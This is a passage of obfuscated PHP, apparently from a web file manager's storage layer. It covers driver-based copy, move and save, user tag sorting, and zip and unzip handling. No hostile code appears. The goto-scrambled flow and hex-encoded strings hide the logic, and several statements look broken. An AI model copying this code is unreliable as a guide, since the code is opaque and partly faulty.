$bٍǫ = !empty($e) ? $E[69] . implode($E[278], $e) : $E[33]; return $this->getHost() . $E[8] . $aψ . $bٍǫ; } public function fileOut($b, $bԂѕ = false, $Cܾ = false, $fۮ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($b, $bԂѕ, $Cܾ, $fۮ); } if (!$Cܾ) { $Cܾ = $this->pathThis($b); } $C = $bԂѕ ? array($_SERVER[Ť][1335] . rawurlencode($Cܾ)) : array(); $dծ = $this->link($b, $C); $this->fileOutLink($dծ); } public function fileOutServer($d, $Eґٚ = false, $D = false, $Fߛ = '') { parent::fileOut($d, $Eґٚ, $D, $Fߛ); } public function fileOutImage($f찴, $F卌 = 250) { $BƵ = $this->link($f찴 . $_SERVER[Ť][1336] . $F卌); $this->fileOutLink($BƵ); } public function fileOutImageServer($Eԓ, $a = 250) { parent::fileOutImage($Eԓ, $a); } public function hashMd5($Cކ) { $eܝ =& $_SERVER[Ť]; $e𾑮 = $this->_objectMeta($Cކ); return isset($e𾑮[$eܝ[204]]) ? $e𾑮[$eܝ[204]] : !1; } public function size($aܒ) { $Bʺ = $this->objectMeta($aܒ); return $Bʺ ? $Bʺ[$_SERVER[Ť][77]] : 0; } public function info($bڟ) { if ($this->isFolder($bڟ)) { return $this->folderInfo($bڟ); } else { if ($this->isFile($bڟ)) { return $this->fileInfo($bڟ); } } return !1; } public function exist($eɘĂ) { return $this->isFile($eɘĂ) || $this->isFolder($eɘĂ); } public function isFile($eͦ٦) { return !$this->isFolder($eͦ٦) && $this->objectMeta($eͦ٦); } public function isFolder($d) { return $this->cacheMethod($_SERVER[Ť][195], $d); } protected function objectMeta($d𨹊) { return $this->cacheMethod($_SERVER[Ť][196], $d𨹊); } protected function _objectMeta($E) { goto d; dο: $Cж = array($e[29] => isset($fȼ֤[$e[1338]]) ? $fȼ֤[$e[1338]] : null, $e[77] => isset($fȼ֤[$e[1339]]) ? $fȼ֤[$e[1339]] : null, $e[204] => isset($fȼ֤[$e[1340]]) ? $fȼ֤[$e[1340]] : null, $e[1307] => isset($fȼ֤[$e[1341]]) ? $fȼ֤[$e[1341]] : null); $Cж[$e[1308]] = isset($fȼ֤[$e[1342]]) ? strtotime($fȼ֤[$e[1342]]) : $Cж[$e[1307]]; return $Cж; goto C߸; a: if (!$Fߨղ[$e[1056]]) { return null; } $fȼ֤ = isset($Fߨղ[$e[1058]]) ? $Fߨղ[$e[1058]] : array(); if (!isset($fȼ֤[$e[1338]])) { return null; } goto dο; d: $e =& $_SERVER[Ť]; if ($E == $e[33] || $E == $e[8]) { return array(); } $Fߨղ = $this->ussRequest($E, $e[1337]); goto a; C߸: } protected function _isFolder($C򈧗) { $b =& $_SERVER[Ť]; if ($C򈧗 == $b[33] || $C򈧗 == $b[8]) { return !0; } $A݋ = $this->_objectMeta($C򈧗); return isset($A݋[$b[29]]) && $A݋[$b[29]] == $b[76] ? !0 : !1; } } goto Eݖ; dɫՉ: class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\145\162\56\164\141\x67\114\151\163\x74"; public $modelType = "\125\x73\145\x72\x4f\160\x74\151\157\156"; public $field = array("\156\x61\x6d\145", "\x73\x74\171\x6c\145", "\x73\157\x72\164"); public function listData($f = false, $Aٔ = "\x73\157\x72\164", $eЂÇ = false) { return parent::listData($f, $Aٔ, $eЂÇ); } public function remove($b) { return parent::remove($b); } public function add($FÅ, $B = "\x6c\x61\142\145\x6c\55\x67\162\145\171\x2d\x6e\157\x72\x6d\141\154") { $aΏ =& $_SERVER[Ť]; if ($this->findByName($FÅ)) { return !1; } $aР͞ҙ = array($aΏ[402] => $FÅ, $aΏ[452] => $B, $aΏ[1656] => $this->getSort($aΏ[252]) + 1); return parent::insert($aР͞ҙ); } public function update($b֡, $Aǵ) { $fל =& $_SERVER[Ť]; $B = $this->listData($b֡); $e퐖 = $this->findByName($Aǵ[$fל[28]]); if (!$B || $e퐖 && $e퐖[$fל[383]] != $B[$fל[383]]) { return !1; } return parent::update($b֡, $Aǵ); } public function moveTop($Eҝ) { $FԐ =& $_SERVER[Ť]; $c = parent::listData(); $d͜ = $this->getSort($FԐ[251]); foreach ($c as &$F) { if ($F[$FԐ[383]] == $Eҝ) { $F[$FԐ[1675]] = $d͜; continue; } $F[$FԐ[1675]] += 1; } unset($F); return parent::resetData($c); } public function moveBottom($C蔺) { $fЎ =& $_SERVER[Ť]; $a = $this->getSort($fЎ[252]) + 1; return parent::update($C蔺, array($fЎ[1675] => $a)); } public function resetSort($dˣ) { goto D; D悃: unset($C); return parent::resetData($cΜ); goto f; C: for ($bذј = 0; $bذј < count($dˣ); $bذј++) { $d먽˳[$dˣ[$bذј] . $f[33]] = $bذј + 1; } $cΜ = parent::listData(); foreach ($cΜ as &$C) { $b = $d먽˳[$C[$f[383]]]; $C[$f[1675]] = $b ? $b : $C[$f[1675]]; } goto D悃; D: $f =& $_SERVER[Ť]; $d먽˳ = array(); $dˣ = is_array($dˣ) ? $dˣ : array(); goto C; f: } private function getSort($BƓ) { $eуط =& $_SERVER[Ť]; $Dߥ = parent::listData(); $e = array_to_keyvalue($Dߥ, $eуط[33], $eуط[1675]); if (!$e) { $e = array(0); } $C宍Є = $BƓ == $eуط[252] ? max($e) : min($e); return intval($C宍Є); } } goto c; f: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($f̭ٵ, $F) { goto Eݱ֣; c: Hook::trigger($Eई[1014] . $f̭ٵ . $Eई[1017], $Dַ, $C̨); return $C̨; goto E퓆; E: Hook::trigger($Eई[1014] . $f̭ٵ . $Eई[1015], $Dַ); $Dݜߨ = self::driverMake($F[0]); if (method_exists($Dݜߨ, $f̭ٵ)) { $C̨ = @call_user_func_array(array($Dݜߨ, $f̭ٵ), $F); } else { if (method_exists($Dݜߨ, $Eई[1016])) { $C̨ = @call_user_func_array(array($Dݜߨ, $f̭ٵ), $F); } else { if (method_exists(self, $f̭ٵ)) { $C̨ = @call_user_func_array(array(self, $f̭ٵ), $F); } else { $C̨ = call_user_func_array(array(parent, $f̭ٵ), $F); } } } goto c; Eݱ֣: $Eई =& $_SERVER[Ť]; $Dַ = $F; $GLOBALS[$Eई[1013]] = $Eई[1014] . $f̭ٵ; goto E; E퓆: } public static function init($f) { return self::driverMake($f); } public static function copy($eل, $Bͩ, $c = false, $d = false) { return self::copyMoveStart($eل, $Bͩ, $c, $_SERVER[Ť][507], $d); } public static function move($aݿ, $Cʇ, $bϮɃ = false, $BО̽ = false) { return self::copyMoveStart($aݿ, $Cʇ, $bϮɃ, $_SERVER[Ť][509], $BО̽); } private static function copyMoveStart($F쭐, $d, $Eܦ, $f, $c݅) { $aŽ =& $_SERVER[Ť]; $Fձ巺 = array($F쭐, $d, $Eܦ, $c݅); Hook::trigger($aŽ[1014] . $f . $aŽ[1015], $Fձ巺); $A㓏 = self::copyMove($F쭐, $d, $Eܦ, $f, $c݅); Hook::trigger($aŽ[1014] . $f . $aŽ[1017], $Fձ巺, $A㓏); return $A㓏; } public static function saveFile($Dґߎ, $eቕ, $eǽ = true) { goto BԨ; f̃: $DՖ = self::driverMake($eቕ); $Bʉӟ = !1; if ($DՖ->pathParse[$e[1018]]) { $f = $DՖ->pathParse[$e[1018]]; $Bʉӟ = $DՖ; $DՖ = self::driverMake($f); } goto b; b: $c練 = $DՖ->pathFather($eቕ); $C륰 = !0; if (!$eǽ && self::driverIsSame($d, $DՖ)) { $C륰 = !1; } goto Ą; BԨ: $e =& $_SERVER[Ť]; $c = self::info($eቕ); $d = self::driverMake($Dґߎ); goto f̃; Ą: $d = self::copyFile($d, $Dґߎ, $DՖ, $c練, $c[$e[28]], $C륰); if ($Bʉӟ) { $d = $Bʉӟ->getPathOuter($d); } return $d; goto b; b: } private static function copyMove($fҥ, $c㗬, $C, $f, $dǗ͎ = false) { goto A; Dӡ: $dʴĪӫ = $Aޛ䋜->isFile($fҥ); if (!$dʴĪӫ && $f刉->getType() == $e˦[704] && $Aޛ䋜->getType() == $e˦[102]) { $B߻ĳ = $f刉->copyFolderFromIO($Aޛ䋜, $fҥ, $c㗬, $C, $e䍢, $dǗ͎); } else { $B߻ĳ = self::copyPath($Aޛ䋜, $fҥ, $f刉, $c㗬, $C, $e䍢, $dʴĪӫ, $dǗ͎); } if ($B߻ĳ && $e䍢) { $Aޛ䋜->remove($fҥ); } goto C؅; A: $e˦ =& $_SERVER[Ť]; if (!$fҥ || $fҥ == $e˦[8] || !$c㗬) { return !1; } ignore_timeout(); goto E넠; f: $E֣ = !1; if ($f刉->pathParse[$e˦[1018]]) { $c㗬 = $f刉->pathParse[$e˦[1018]]; $E֣ = $f刉; $f刉 = self::driverMake($c㗬); } self::check($Aޛ䋜, $fҥ, $f刉, $c㗬); goto cС; C؅: if ($E֣) { $B߻ĳ = $E֣->getPathOuter($B߻ĳ); } return $B߻ĳ; goto Aں; E넠: $Aޛ䋜 = self::driverMake($fҥ); $f刉 = self::driverMake($c㗬); $e䍢 = $f == $e˦[509]; goto f; cС: Hook::trigger($e˦[72], $Aޛ䋜, $fҥ, $f刉, $c㗬); $Bܖɖ = self::driverIsSame($Aޛ䋜, $f刉); if ($Bܖɖ) { if ($f == $e˦[509] && !method_exists($f刉, $e˦[1019]) && trim($c㗬, $e˦[8]) == trim($f刉->pathFather($fҥ), $e˦[8])) { if ($Aޛ䋜->pathThis($fҥ) != $dǗ͎ && !$Aޛ䋜->isTypeObject()) { return $Aޛ䋜->rename($fҥ, $dǗ͎); } return $f刉->getPathOuter($fҥ); } if (method_exists($f刉, $f)) { return $f刉->{$f}($fҥ, $c㗬, $C); } } goto Dӡ; Aں: } private static function check($d, $e, $D, &$f݂) { $C۸ =& $_SERVER[Ť]; if (self::driverIsSame($d, $D) && $d->isFolder($e) && $d->isParentOf($e, $f݂)) { show_json(LNG($C۸[1020]), !1); } if (!$d->exist($e)) { show_json(LNG($C۸[101]), !1); } } private static function copyPath($dݛ, $e֪, $cڌ, $Eٳی, $a⒂, $Eԓ, $bڐ, $a̙ɐ = false) { goto b¼; b¼: $Eб =& $_SERVER[Ť]; $eҼ = $a̙ɐ ? $a̙ɐ : $dݛ->pathThis($e֪); if ($a⒂) { $dʇ̂ = $cڌ->fileNameExist($Eٳی, $eҼ); $eҼ = $cڌ->fileNameAuto($Eٳی, $eҼ, $a⒂, !$bڐ); $a⒂ = $dʇ̂ ? $a⒂ : !1; } goto b; b÷م: $cԻ = $cڌ->mkdir($cڌ->getPath($F޽)); $Eٳی = $cڌ->getPathInner($cԻ); $Bܼ䊲 = $dݛ->listPath($e֪, !0); goto C; b: if ($bڐ) { return self::copyFile($dݛ, $e֪, $cڌ, $Eٳی, $eҼ, $Eԓ); } if ($a⒂ == REPEAT_RENAME_FOLDER) { $a⒂ = !1; } $F޽ = rtrim($Eٳی, $Eб[8]) . $Eб[8] . $eҼ; goto b÷م; C: $d̼ = array_merge($Bܼ䊲[$Eб[73]], $Bܼ䊲[$Eб[74]]); foreach ($d̼ as $b) { $b = $b[$Eб[29]] == $Eб[171]; $e֪ = $dݛ->getPathInner($b[$Eб[75]]); $d = self::copyPath($dݛ, $e֪, $cڌ, $Eٳی, $a⒂, $Eԓ, $b); if (!$d) { IO::errorTips($Eб[1021] . $e֪ . $Eб[66] . $Eٳی); } } return $cԻ; goto B; B: } private static function copyFile($fϏ, $Fي, $fķ, $b޾Ň, $eѭ˼, $F嫅֯) { goto eƺ; Eܐ: Hook::trigger($F܌[1023], $fϏ, $Fي, $fķ, $b޾Ň, $eѭ˼, $c); if (self::driverIsSame($fϏ, $fķ)) { if ($F嫅֯) { $Fŕ = $fķ->moveFile($Fي, $b޾Ň); } else { $Fŕ = $fķ->copyFile($Fي, $b޾Ň); } Hook::trigger($F܌[1024], $fϏ, $Fي, $fķ, $b޾Ň, $eѭ˼, $Fŕ); return $Fŕ; } $b = TEMP_FILES; goto FВ; FВ: mk_dir($b); $F䛄 = $b . $c; $F䛄 = $fϏ->download($Fي, $F䛄); goto e; e: $F䛄 = $fϏ->iconvApp($F䛄); $Fŕ = $fķ->upload($b޾Ň, $F䛄, $F嫅֯); self::remove($b . $c); goto Dݙƥ; Dݙƥ: Hook::trigger($F܌[1024], $fϏ, $Fي, $fķ, $b޾Ň, $eѭ˼, $Fŕ); return $Fŕ; goto b󐈽ǐ; eƺ: $F܌ =& $_SERVER[Ť]; $b޾Ň = $fķ->getPath(rtrim($b޾Ň, $F܌[8]) . $F܌[8] . $eѭ˼); $c = $F܌[1022] . time() . rand_string(5); goto Eܐ; b󐈽ǐ: } public static function pathFather($C묾؉) { $F׿ = IO::init($C묾؉); $Bߕ = $F׿->pathFather($F׿->path); return $F׿->getPathOuter($Bߕ); } public static function fileOut($A, $Eۇ = false, $bҪъ = false, $dυ܂ = '') { $BƧ = self::driverMake($A); if ($BƧ->isFileOutServer()) { return $BƧ->fileOutServer($A, $Eۇ, $bҪъ, $dυ܂); } return $BƧ->fileOut($A, $Eۇ, $bҪъ, $dυ܂); } public static function fileOutImage($aİ, $A愝 = 250) { $aѩ = array(250, 600, 1200, 3000, 5000); for ($dΎ = 0; $dΎ < count($aѩ); $dΎ++) { if ($dΎ == 0 && $A愝 <= $aѩ[$dΎ]) { $A愝 = $aѩ[$dΎ]; break; } else { if ($A愝 > $aѩ[$dΎ - 1] && $A愝 <= $aѩ[$dΎ]) { $A愝 = $aѩ[$dΎ]; break; } else { if ($dΎ == count($aѩ) - 1 && $A愝 > $aѩ[$dΎ]) { $A愝 = $aѩ[$dΎ]; break; } } } } $B = self::driverMake($aİ); if ($B->isFileOutServer()) { return $B->fileOutImageServer($aİ, $A愝); } return $B->fileOutImage($aİ, $A愝); } private static function driverIsSame($c, $A) { goto EΘ; C: if ($f != $f܏鳳) { return !1; } if ($f == $C[704]) { return !0; } if ($f == $C[102]) { return !0; } goto bϤ; bϤ: if ($c->pathDriver == $A->pathDriver) { return !0; } return !1; goto F; EΘ: $C =& $_SERVER[Ť]; $f = $c->getType(); $f܏鳳 = $A->getType(); goto C; F: } public static function copyUpdate($a±, $EéȔ) { goto F; bȆ: Hook::trigger($BՉ篶[1028], $a±, $EéȔ, $e汎); foreach ($E빵 as $fƜآ) { IO::mkdir($fƜآ); } foreach ($F as $fƜآ) { IO::copy($fƜآ[$BՉ篶[1025]], $fƜآ[$BՉ篶[1026]], REPEAT_REPLACE); } goto E̿; a݉: $FȮ = self::_listAll($a±); $e = self::_listAll($EéȔ); $F = array(); goto c״ˡ; F: $BՉ篶 =& $_SERVER[Ť]; if (!IO::exist($a±)) { return !1; } if (!IO::exist($EéȔ)) { IO::mkdir($EéȔ); } goto a݉; c״ˡ: $E빵 = array(); foreach ($FȮ as $eЃɯ => $fƜآ) { if (isset($e[$eЃɯ])) { if ($fƜآ[$BՉ篶[76]] == 1) { continue; } if ($e[$eЃɯ][$BՉ篶[77]] == $fƜآ[$BՉ篶[77]]) { continue; } } if ($fƜآ[$BՉ篶[76]] == 1) { $E빵[] = $EéȔ . $BՉ篶[8] . $eЃɯ; continue; } $D挎 = strstr(trim($eЃɯ, $BՉ篶[8]), $BՉ篶[8]) ? get_path_father($eЃɯ) : $BՉ篶[33]; $F[] = array($BՉ篶[1025] => $fƜآ[$BՉ篶[75]], $BՉ篶[1026] => rtrim($EéȔ, $BՉ篶[8]) . $BՉ篶[8] . $D挎, $BՉ篶[1027] => $fƜآ); } $e汎 = array($BՉ篶[171] => $F, $BՉ篶[76] => $E빵); goto bȆ; E̿: } private static function _listAll($dՏ) { $B =& $_SERVER[Ť]; $dՏ = KodIO::clear($dՏ); $Fڶ = IO::listAll($dՏ); foreach ($Fڶ as &$D΋题) { $Dꪒ = substr($D΋题[$B[75]], strlen($dՏ)); $D΋题[$B[1029]] = trim($Dꪒ, $B[8]); } unset($D΋题); return array_to_keyvalue($Fڶ, $B[1029]); } public static function fileSubstr($F䅅, $aՌꨒ, $Fɂö = false) { goto cˣ; Aύ: if ($Fɂö <= 0) { return $a݋֓[33]; } if ($aՌꨒ < 0 || $aՌꨒ >= $A || $Fɂö > 1024 * 1024 * 5) { throw new Exception("\146\x69\154\x65\x52\145\x61\144\40\x65\x72\x72\x6f\162\41\40\x73\x74\x61\162\x74\x3d{$aՌꨒ}\x3b\154\145\x6e\x67\164\x68\75{$Fɂö}\73\40\163\151\x7a\x65\x3d{$A}\73"); } $b = $a->fileSubstr($F䅅, $aՌꨒ, $Fɂö); goto Cנ; Cנ: if (!$b && $Fɂö && isset($GLOBALS[$a݋֓[1032]])) { throw new Exception($GLOBALS[$a݋֓[1032]][$a݋֓[1033]]); } return $b; goto F隺; e֊: if ($Fɂö === !1) { $Fɂö = $A - $aՌꨒ; } if ($aՌꨒ + $Fɂö > $A) { $Fɂö = $A - $aՌꨒ; } if (!$A && $a->getType() == $a݋֓[102] && !$a->exist($F䅅)) { throw new Exception($a݋֓[1030] . LNG($a݋֓[1031])); } goto Aύ; AܢЭ: $e = $aՌꨒ; $b = $Fɂö; if ($aՌꨒ < 0) { $aՌꨒ = $A + $aՌꨒ; } goto e֊; cˣ: $a݋֓ =& $_SERVER[Ť]; $a = self::driverMake($F䅅); $A = $a->size($F䅅); goto AܢЭ; F隺: } private static function driverMake(&$d҆Ì) { goto B; a٩: if ($E͈[$bԲ[29]] == KodIO::KOD_IO && !self::$driverListSystem[$E͈[$bԲ[383]]]) { return !1; } $d҆Ì = $E͈[$bԲ[1034]]; $EϏ = self::driverGet($E͈, $d҆Ì); goto DӔӛ; DӔӛ: return $EϏ; goto b; B: $bԲ =& $_SERVER[Ť]; $E͈ = KodIO::parse($d҆Ì); if (!self::$driverListSystem) { $fب֭ = Model($bԲ[713])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($fب֭, $bԲ[383]); } goto a٩; b: } private static function driverGet($D׳۫, &$aҋ۟۾) { goto cǘ; e: $D͍ = self::$driverCache[$bǜ]; $D͍->pathDriver = $fߞ; $D͍->pathBase = $e됍[33]; goto b픑; B˞: $D͍->path = $aҋ۟۾; return $D͍; goto e; cǘ: $e됍 =& $_SERVER[Ť]; $fߞ = $D׳۫[$e됍[1035]]; $fͫ = $D׳۫[$e됍[383]]; goto bڤ; b픑: if (isset($B[$e됍[6]][$e됍[1046]])) { $D͍->pathBase = rtrim($B[$e됍[6]][$e됍[1046]], $e됍[8]) . $e됍[8]; $aҋ۟۾ = $D͍->pathBase . ltrim($aҋ۟۾, $e됍[8]); } $aҋ۟۾ = $D͍->getPath($aҋ۟۾); if (isset($D׳۫[$e됍[1018]])) { $aҋ۟۾ = $D׳۫[$e됍[1018]]; } goto B˞; bڤ: switch ($D׳۫[$e됍[29]]) { case KodIO::KOD_IO: $B = self::$driverListSystem[$fͫ]; break; case KodIO::KOD_SOURCE: $aҋ۟۾ = $fͫ . $aҋ۟۾; $B = array($e됍[1036] => $e됍[1037], $e됍[6] => $D׳۫); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $bؚ = $GLOBALS[$e됍[1038]]; self::$driverListUser = array_to_keyvalue($bؚ, $e됍[383]); } $B = self::$driverListUser[$fͫ]; break; case KodIO::KOD_SHARE_LINK: $B = array($e됍[1036] => $e됍[1039], $e됍[6] => $D׳۫); $dԽ = Action($e됍[1040])->sharePathInfo($D׳۫[$e됍[75]]); $aҋ۟۾ = $dԽ[$e됍[385]]; if (!$dԽ[$e됍[385]]) { $eۛ = Model($e됍[552])->getInfo($dԽ[$e됍[456]]); $aҋ۟۾ = KodIO::clear($eۛ[$e됍[1041]] . $D׳۫[$e됍[1034]]); $D׳۫[$e됍[454]] = $eۛ; $D׳۫[$e됍[1018]] = $aҋ۟۾; $B = array($e됍[1036] => $e됍[1042], $e됍[6] => $D׳۫); } break; case KodIO::KOD_SHARE_ITEM: $B = array($e됍[1036] => $e됍[1043], $e됍[6] => $D׳۫); $eۛ = Model($e됍[552])->getInfo($D׳۫[$e됍[383]]); if ($eۛ[$e됍[385]] == $e됍[485]) { $aҋ۟۾ = KodIO::clear($eۛ[$e됍[1041]] . $D׳۫[$e됍[1034]]); $D׳۫[$e됍[454]] = $eۛ; $D׳۫[$e됍[1018]] = $aҋ۟۾; $B = array($e됍[1036] => $e됍[1044], $e됍[6] => $D׳۫); } else { if (!$aҋ۟۾) { $aҋ۟۾ = $eۛ[$e됍[385]]; } } break; default: $aҋ۟۾ = $D׳۫[$e됍[75]]; $B = array($e됍[1036] => $e됍[1045]); break; } $bǜ = $D׳۫[$e됍[75]]; if (!isset(self::$driverCache[$bǜ])) { $e = strtolower($B[$e됍[90]]); $aز = $GLOBALS[$e됍[6]][$e됍[84]][$e됍[769]]; $B = $e됍[71] . (isset($aز[$e]) ? $aز[$e] : ucfirst($e)); if (!class_exists($B)) { show_json("{$B}\x20\156\x6f\x74\x20\x65\x78\151\x73\164\163\41", !1); } $AÊ = isset($B[$e됍[6]]) ? $B[$e됍[6]] : !1; self::$driverCache[$bǜ] = new $B($AÊ); } goto e; e: } public static function errorTips($Cּ = false) { goto d; F˝ɑٞ: if ($Cּ === -1) { return $aҊ ? $aҊ[count($aҊ) - 1] : $CюÖ[33]; } if ($Cּ === !1) { return implode($CюÖ[225], $aҊ); } if (count($aҊ) >= $f⯌ޖ) { $aҊ = array_slice($aҊ, $f⯌ޖ * 0.5, $f⯌ޖ); } goto Bذ; d: $CюÖ =& $_SERVER[Ť]; static $aҊ = array(); $f⯌ޖ = 1000; goto F˝ɑٞ; Bذ: $aҊ[] = $Cּ; write_log($CюÖ[157] . ACTION . $CюÖ[1047] . $Cּ, $CюÖ[1048]); goto B; B: } public static function getLastError($d = '') { $Bˋ = self::errorTips(-1); return $Bˋ ? $Bˋ : $d; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $aݓ; if (!$aݓ) { $dǙ = IO::init($_SERVER[Ť][8]); } return $dǙ; } private static function iconvSystem($cѹ) { return self::local()->iconvSystem($cѹ); } private static function iconvApp($E) { return self::local()->iconvApp($E); } public static function zip($dգ, $aܑ = "\x7a\x69\160", $eؖ = '', $Aָے = REPEAT_RENAME) { goto f̏; EȞ: if (count($F) > 1) { $aז = IO::info(IO::pathFather($B[$bՎ[75]])); $b≡ُ = $aז[$bՎ[28]]; } $d = $Dמ; if (!$d) { $d = get_path_father($B[$bՎ[75]]); if (!$eؖ && $Aŋ->getType() == $bՎ[102]) { $d = get_path_father($Aŋ->path); } $d = IO::info($d); if (!$d[$bՎ[192]]) { show_json(LNG($bՎ[1050]), !1); } } goto FǐǠ; F蘠: $Dמ = !1; if (!$eؖ && $Aŋ->getType() == $bՎ[102]) { $F = self::zipFileList($dգ); } else { $Dמ = $eؖ ? $eؖ : TEMP_FILES . $bՎ[1049] . time() . rand_string(8) . $bՎ[8]; mk_dir($Dמ); $F = self::zipFileList($dգ, $Dמ); } $b≡ُ = $B[$bՎ[28]]; goto EȞ; f̏: $bՎ =& $_SERVER[Ť]; $Aŋ = self::init($dգ[0][$bՎ[75]]); $B = self::info($dգ[0][$bՎ[75]]); goto F蘠; EުĂ: if (!$D㔊ϒ) { del_dir($Dמ); show_json(LNG($bՎ[1051]), !1); } del_dir($Dמ); return $D㔊ϒ; goto c剱Ԭň; AВε: foreach ($F as $F => $Aܘ) { $F[$F] = self::iconvSystem($Aܘ); } KodArchive::create($eƏ, $F); if (!IO::exist($D)) { if ($Dמ) { del_dir($Dמ); } show_json(LNG($bՎ[1051]), !1); } goto cޥ; cޥ: if ($eؖ || !$Dמ) { if ($Dמ && strstr($Dמ, TEMP_FILES)) { $Aݞ = $F = array(); recursion_dir($d, $Aݞ, $F, 0); foreach ($Aݞ as $D爋) { del_dir($D爋); } foreach ($F as $B澥ć؆) { if ($B澥ć؆ == $eƏ) { continue; } del_file($B澥ć؆); } } return $D; } $d = self::pathFather($B[$bՎ[75]]); $D㔊ϒ = self::move($D, $d, $Aָے); goto EުĂ; FǐǠ: $D = $d . $b≡ُ . $bՎ[91] . $aܑ; $D = get_filename_auto($D, $bՎ[33], $Aָے); $eƏ = self::iconvSystem($D); goto AВε; c剱Ԭň: } public static function unzip($eٍҔ, $A҄ = "\162\145\160\x6c\141\x63\145") { goto dΡܓ; A: foreach ($F as $cߊ) { $cߊ = self::iconvApp($cߊ); self::move($cߊ, $D㌗, $A҄); } del_dir($f); if (!$b) { del_file($d); } goto cұ; cұ: return !0; goto D; F: mk_dir($f); $Bۋ҃ = self::fileExt($Dૉ); $d = $f . $A힇[91] . $Bۋ҃; goto c̈́; dΡܓ: $A힇 =& $_SERVER[Ť]; $C׌ = $eٍҔ[$A힇[75]]; $D㌗ = $eٍҔ[$A힇[1052]]; goto C海; e紃: Hook::trigger($A힇[1059], $f); recursion_dir($f, $D䍸, $aݵ, 0); $F = array_merge($D䍸, $aݵ); goto A; C海: if (!($Dૉ = parent::info($C׌))) { show_json(LNG($A힇[1053]), !1); } if (!($FƠܴ = parent::infoFull($D㌗))) { $D㌗ = parent::mkdir($D㌗); $FƠܴ = array($A힇[75] => $D㌗); } else { if (isset($FƠܴ[$A힇[385]]) && trim($FƠܴ[$A힇[75]], $A힇[8]) != trim($D㌗, $A힇[8])) { $B = KodIO::make($FƠܴ[$A힇[478]]); $cٺ = parent::fileNameAuto($B, $FƠܴ[$A힇[28]], REPEAT_RENAME_FOLDER, !0); $D㌗ = parent::mkdir($B . $cٺ); $FƠܴ = array($A힇[75] => $D㌗); } } $D㌗ = $FƠܴ[$A힇[75]]; goto D櫧; c̛: $Aӎ߯ = KodArchive::extract($d, $f . $A힇[8], $Bڃ); self::archiveExt(); if (!$Aӎ߯[$A힇[1056]]) { show_json($A힇[1057] . $Aӎ߯[$A힇[1058]], !1); } goto e紃; D櫧: $EŮ = self::tmpFileName($Dૉ); $f = TEMP_FILES . $EŮ; del_dir($f); goto F; c̈́: if (!@file_exists(self::iconvSystem($d))) { $b = self::localFilePath($C׌, $Bۋ҃); $d = $b ? $b : parent::download($C׌, $d); } $d = self::iconvSystem($d); $Bڃ = isset($eٍҔ[$A힇[1054]]) ? $eٍҔ[$A힇[1054]] : $A힇[1055]; goto c̛; D: } public static function unzipList($B) { goto e⊊; e⊊: $DМ =& $_SERVER[Ť]; $eӇ = $B[$DМ[75]]; $F˅ = isset($B[$DМ[1060]]) ? $B[$DМ[1060]] : -1; goto A; b̟: $dԴ = self::iconvSystem($dԴ); if ($F˅ >= 0) { $aͼ = isset($B[$DМ[1064]]) ? $B[$DМ[1064]] : !1; $cￔ = isset($B[$DМ[28]]) ? $B[$DМ[28]] : $DМ[33]; KodArchive::filePreview($dԴ, $F˅, $aͼ, $cￔ); self::archiveExt(); die; } $C = KodArchive::listContent($dԴ); goto CԤ; C⽖: $AµƧ = json_encode($C[$DМ[1058]]); self::setContent($B􏍱, $AµƧ); if (count($C[$DМ[1058]]) >= $Aј) { show_json(sprintf(LNG($DМ[1062]), count($C[$DМ[1058]])), !1); } goto A苢; A苢: return $C[$DМ[1058]]; goto c; CԤ: self::archiveExt(); del_dir($A); if (!$C[$DМ[1056]]) { show_json($C[$DМ[1058]], !1); } goto C⽖; a: if (!is_dir($A)) { mk_dir($A); } $dԴ = $A . $DМ[8] . $c; if (!@file_exists(self::iconvSystem($dԴ))) { if (isset($a)) { url_request($eӇ, $DМ[1063], $dԴ); } else { $C = self::localFilePath($eӇ, $A); $dԴ = $C ? $C : self::download($eӇ, $dԴ); } } goto b̟; A: $Aј = 50000; if (request_url_safe($eӇ)) { $a = parse_url_query($eӇ); if (!isset($a[$DМ[75]])) { show_json($DМ[1061], !1); } } $Bׂ = isset($a) ? $a[$DМ[75]] : $eӇ; goto B❍; Fҹ: if (isset($a)) { $CɈ = array($a[$DМ[75]], $a[$DМ[1060]], $a[$DМ[28]]); $c = md5(implode($DМ[70], $CɈ)) . $DМ[91] . get_path_ext($a[$DМ[28]]); } else { $CɈ = array($aڌ[$DМ[28]], $aڌ[$DМ[75]], $aڌ[$DМ[77]]); $c = md5(implode($DМ[70], $CɈ)) . $DМ[91] . $A; } if ($F˅ == -1) { $B􏍱 = IO_PATH_SYSTEM_TEMP . "\172\x69\x70\x56\151\x65\x77\57{$aʋ}\x2f{$c}\x2e\x6c\x6f\147"; $B֕ = self::infoFull($B􏍱); if ($B֕) { $B􏍱 = $B֕[$DМ[75]]; $FĲ = self::getContent($B􏍱); if ($FĲ) { $AµƧ = json_decode($FĲ, !0); if (count($AµƧ) >= $Aј) { show_json(sprintf(LNG($DМ[1062]), count($AµƧ)), !1); } return $AµƧ; } } else { $B􏍱 = self::mkfile($B􏍱); } } $A = TEMP_FILES . $aʋ; goto a; B❍: $aڌ = self::info($Bׂ); $A = self::fileExt($aڌ); $aʋ = self::tmpFileName($aڌ); goto Fҹ; c: } private static function fileExt($c̼) { $cޜ =& $_SERVER[Ť]; $F = $c̼[$cޜ[165]]; if ($F == $cޜ[1065]) { $C = $cޜ[1066]; if (substr($c̼[$cޜ[28]], -strlen($C)) == $C) { $F = $cޜ[1067]; } } self::archiveExt($F); return $F; } private static function zipFileList($aޞɠ, $bڻ = false) { $dڏ =& $_SERVER[Ť]; $E㒑 = array(); foreach ($aޞɠ as $C꤇) { $eǂ = $C꤇[$dڏ[75]]; if ($bڻ) { $eǂ = self::copy($C꤇[$dڏ[75]], $bڻ, $dڏ[761]); } else { $a϶ = self::init($C꤇[$dڏ[75]]); if ($a϶->getType() == $dڏ[102]) { $eǂ = $a϶->path; } } if ($eǂ && self::local()->exist($eǂ)) { $E㒑[$C꤇[$dڏ[75]]] = $eǂ; } } if (!empty($E㒑)) { return array_values($E㒑); } show_json(LNG($dڏ[1031]), !1); } public static function tmpFileName($D) { $cя =& $_SERVER[Ť]; $cآ = array($D[$cя[28]], $D[$cя[75]], $D[$cя[77]], 